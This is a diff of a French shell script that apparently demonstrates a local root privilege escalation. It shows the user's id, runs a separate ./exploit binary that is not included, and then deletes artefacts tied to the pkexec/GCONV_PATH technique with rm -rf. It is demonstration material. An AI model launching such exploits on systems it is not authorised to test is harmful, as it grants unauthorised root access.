@@ -10,13 +10,15 @@ N='\033[0m'
 clear
 echo "Démonstration de la faille de sécurité permettant de passer en root"
 echo "----------------------------------------"
-echo -e "${C}             --> Enter pour continuer${N}"
-read
-sleep 1
 echo -e "${E}Vous êtes actuellement l'utilisateur : ${N}"
 echo
 id
 echo
-echo -e "${E}Exécution du programme : ${N}"
+echo -e "${E}Exécution du programme : exit pour quitter le bash ${N}"
 echo
 ./exploit
+echo -e "${E}Supression des dossiers générés : ${N}"
+rm -rf GCONV_PATH=.
+# find -type l : Trouver le path du lien symbolique créé
+rm ./.pkexec/pkexec.so
+
